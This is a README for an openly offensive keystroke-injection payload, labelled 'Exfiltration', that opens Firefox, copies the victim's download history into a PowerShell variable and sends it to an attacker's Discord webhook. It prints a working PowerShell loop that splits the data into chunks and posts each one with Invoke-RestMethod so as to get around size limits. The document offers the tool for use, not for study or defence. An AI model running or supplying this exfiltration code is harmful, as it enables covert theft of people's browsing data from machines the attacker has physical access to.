# Exports all the links of the downloads

This script can be used to export all the links of the latest downloads made through Firefox.

**Category**: Exfiltration


## Description

This script can be used to export all the links of the latest downloads made through Firefox.

This script open the Firefox app, then go to downloads page and copy all, then open a PowerShell and put all the download link in a var named $DOWNLOADS, then use a Discord Webhook to exfiltrate it.


## Dependencies

* Firefox must be installed
* Internet connection


## Settings

- You must define your Discord webhook if you want to use this method for the exfiltration

    `DEFINE DISCORD_WEBHOOK example`

- This delay depends on the number of links

    `DELAY 10000`

- This algorithm is used to avoid the size limit imposed by Invoke-RestMethod on the payload length

    ```
    $len = $DOWNLOADS.Length
        $MAX_LEN = 1900

        $ITERATIONS = [math]::Ceiling($len / $MAX_LEN)

        for ($i = 0; $i -lt $ITERATIONS; $i++) {
            $init = $i * $MAX_LEN
            $end = [math]::Min(($i + 1) * $MAX_LEN, $len)
            
            $sub = $DOWNLOADS.Substring($init, $end - $init)
            $Payload = @{content = $sub} | ConvertTo-Json

            Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $Payload -ContentType 'application/json'
        }
    ```

## Credits

<h2 align="center"> Aleff :octocat: </h2>
<div align=center>
<table>
  <tr>
    <td align="center" width="96">
      <a href="https://github.com/aleff-github">
        <img src=https://github.com/aleff-github/aleff-github/blob/main/img/github.png?raw=true width="48" height="48" />
      </a>
      <br>Github
    </td>
    <td align="center" width="96">
      <a href="https://www.linkedin.com/in/alessandro-greco-aka-aleff/">
        <img src=https://github.com/aleff-github/aleff-github/blob/main/img/linkedin.png?raw=true width="48" height="48" />
      </a>
      <br>Linkedin
    </td>
  </tr>
</table>
</div>